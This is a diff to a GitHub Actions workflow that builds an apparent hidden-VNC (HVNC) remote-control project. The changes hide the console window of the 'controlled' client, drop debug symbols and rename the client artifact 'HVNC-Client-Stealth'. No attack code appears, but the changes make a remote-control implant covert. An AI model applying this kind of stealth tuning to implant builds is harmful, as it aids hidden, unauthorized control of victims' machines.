@@ -1,4 +1,4 @@
-name: Build HVNC Project (No Optimization, Static Link, Official Standard)
+name: Build HVNC Project (No Console, No PDB, No Optimization)
 on:
   push:
     branches: [ "main" ]
@@ -25,7 +25,8 @@ jobs:
           New-Item -Path "${{ github.workspace }}\build_output\Client" -ItemType Directory -Force
           New-Item -Path "${{ github.workspace }}\build_output\Server" -ItemType Directory -Force
 
-      - name: Build Client (No Optimization, Static Link)
+      # 被控端（Client）：无控制台、无PDB、无优化、静态链接
+      - name: Build Client (No Console, No PDB, No Optimization)
         run: |
           msbuild Client/HVNC.vcxproj `
             /p:Configuration=Release `
@@ -35,11 +36,14 @@ jobs:
             /p:LinkIncremental=false `
             /p:Optimize=false `
             /p:LinkTimeCodeGeneration=false `
+            /p:GenerateDebugInformation=false `
+            /p:SubSystem=Windows `  # 关键：隐藏控制台窗口
             /p:AdditionalLinkerOptions="/Od /OPT:NOREF /OPT:NOICF /WHOLEARCHIVE" `
             /nologo `
             /verbosity:minimal
 
-      - name: Build Server (No Optimization, Static Link)
+      # 主控端（Server）：保留控制台（方便调试）、无PDB、无优化、静态链接
+      - name: Build Server (No PDB, No Optimization)
         run: |
           msbuild Server/Server.vcxproj `
             /p:Configuration=Debug `
@@ -49,6 +53,7 @@ jobs:
             /p:LinkIncremental=false `
             /p:Optimize=false `
             /p:LinkTimeCodeGeneration=false `
+            /p:GenerateDebugInformation=false `
             /p:AdditionalLinkerOptions="/Od /OPT:NOREF /OPT:NOICF /WHOLEARCHIVE" `
             /nologo `
             /verbosity:minimal
@@ -61,13 +66,13 @@ jobs:
       - name: Upload Client artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: HVNC-Client-NoOpt-Static
+          name: HVNC-Client-Stealth
           path: ${{ github.workspace }}\build_output\Client\
           retention-days: 7
 
       - name: Upload Server artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: HVNC-Server-NoOpt-Static
+          name: HVNC-Server-Debug
           path: ${{ github.workspace }}\build_output\Server\
           retention-days: 7
